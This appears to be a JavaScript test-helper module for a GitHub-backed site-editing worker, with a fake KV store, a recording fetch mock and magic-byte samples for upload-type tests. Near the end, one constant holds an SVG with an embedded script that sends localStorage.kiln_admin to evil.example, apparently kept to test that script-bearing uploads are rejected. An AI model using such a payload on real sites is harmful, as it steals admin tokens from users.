/**
 * A small in-memory stand-in for the worker's two outside dependencies, so
 * tests can drive the REAL request handlers end to end:
 *
 *   fakeKV()      — the KILN KV binding (get/put/delete/list), seeded per test
 *   fakeGitHub()  — a routed replacement for global fetch that plays GitHub
 *                   (and any other host a test names) and records every call
 *
 * Nothing here touches the network. Not a test file itself (the runner only
 * picks up *.test.js).
 */

import worker from '../worker/index.js';

export const REPO = 'acme/site';
export const SESSION = 'a'.repeat(64);
export const ORIGIN = 'https://site.example';

export function fakeKV(seed = {}) {
  const m = new Map();
  for (const [k, v] of Object.entries(seed)) m.set(k, typeof v === 'string' ? v : JSON.stringify(v));
  return {
    map: m,
    async get(key, type) {
      const v = m.get(key);
      if (v === undefined) return null;
      return type === 'json' ? JSON.parse(v) : v;
    },
    async put(key, value) { m.set(key, String(value)); },
    async delete(key) { m.delete(key); },
    async list({ prefix = '' } = {}) {
      const keys = [...m.keys()].filter(k => k.startsWith(prefix)).sort().map(name => ({ name }));
      return { keys, list_complete: true };
    },
  };
}

/** An editor session (Google sign-in) for REPO, plus a cached installation token. */
export function editorEnv(session = {}, extra = {}) {
  return {
    ALLOWED_ORIGINS: ORIGIN,
    KILN: fakeKV({
      [`esess:${SESSION}`]: { repo: REPO, name: 'Sam', role: 'editor', email: 'sam@example.com', paths: [''], keys: [], features: null, mode: null, ...session },
      [`itok:${REPO}`]: 'installation-token',
      ...extra,
    }),
  };
}

export const b64 = (input) => Buffer.from(input).toString('base64');
export const jsonRes = (obj, status = 200, headers = {}) =>
  new Response(JSON.stringify(obj), { status, headers: { 'Content-Type': 'application/json', ...headers } });

/**
 * Replace global fetch with `handler(url, init)` for the duration of `fn`.
 * `handler` returns a Response (or undefined for a 404). Every call is
 * recorded as { method, url, body } in the array handed to `fn`.
 */
export async function withFetch(handler, fn) {
  const real = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (input, init = {}) => {
    const url = typeof input === 'string' ? input : input.url;
    const method = (init.method || 'GET').toUpperCase();
    let body = init.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { /* keep the text */ } }
    calls.push({ method, url, body, headers: init.headers || {} });
    const res = await handler(url, { ...init, method });
    return res || new Response('{"message":"Not Found"}', { status: 404, headers: { 'Content-Type': 'application/json' } });
  };
  try { return await fn(calls); } finally { globalThis.fetch = real; }
}

/** Call the worker like a browser would. Returns { status, json, res }. */
export async function call(env, method, path, { body, headers = {}, session = SESSION } = {}) {
  const init = { method, headers: { Origin: ORIGIN, ...(session ? { 'X-Kiln-Session': session } : {}), ...headers } };
  if (body !== undefined) {
    init.body = typeof body === 'string' ? body : JSON.stringify(body);
    init.headers['Content-Type'] = 'application/json';
  }
  const res = await worker.fetch(new Request(`https://worker.example${path}`, init), env);
  let json = null;
  try { json = await res.clone().json(); } catch { /* not JSON */ }
  return { status: res.status, json, res };
}

// Leading bytes of real files, padded to 64 bytes — one per allowed upload type.
export const bytes = (...parts) => Buffer.concat(parts.map(p => typeof p === 'string' ? Buffer.from(p, 'latin1') : Buffer.from(p)));
export const pad = (buf, n = 64) => new Uint8Array(Buffer.concat([buf, Buffer.alloc(Math.max(0, n - buf.length))]));
export const SAMPLES = {
  png: pad(bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])),
  jpeg: pad(bytes([0xff, 0xd8, 0xff, 0xe0], 'JFIF')),
  gif: pad(bytes('GIF89a')),
  webp: pad(bytes('RIFF', [0x24, 0, 0, 0], 'WEBPVP8 ')),
  avif: pad(bytes([0, 0, 0, 0x20], 'ftypavif')),
  ico: pad(bytes([0, 0, 1, 0, 1, 0])),
  pdf: pad(bytes('%PDF-1.7\n')),
  woff2: pad(bytes('wOF2')),
  woff: pad(bytes('wOFF')),
  ttf: pad(bytes([0, 1, 0, 0, 0, 0x10])),
  otf: pad(bytes('OTTO')),
  mp3: pad(bytes('ID3', [3, 0])),
  mp3frame: pad(bytes([0xff, 0xfb, 0x90, 0x00])),
  mp4: pad(bytes([0, 0, 0, 0x18], 'ftypisom')),
  mov: pad(bytes([0, 0, 0, 0x14], 'ftypqt  ')),
  webm: pad(bytes([0x1a, 0x45, 0xdf, 0xa3])),
  ogg: pad(bytes('OggS')),
  wav: pad(bytes('RIFF', [0x24, 0, 0, 0], 'WAVEfmt ')),
  zip: pad(bytes('PK', [3, 4, 0x14, 0])),
};
export const SVG_SCRIPT = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/?c="+localStorage.kiln_admin)</script></svg>';

/** Did any recorded call WRITE to GitHub (anything but a GET)? */
export const githubWrites = (calls) =>
  calls.filter(c => c.url.startsWith('https://api.github.com/') && c.method !== 'GET');
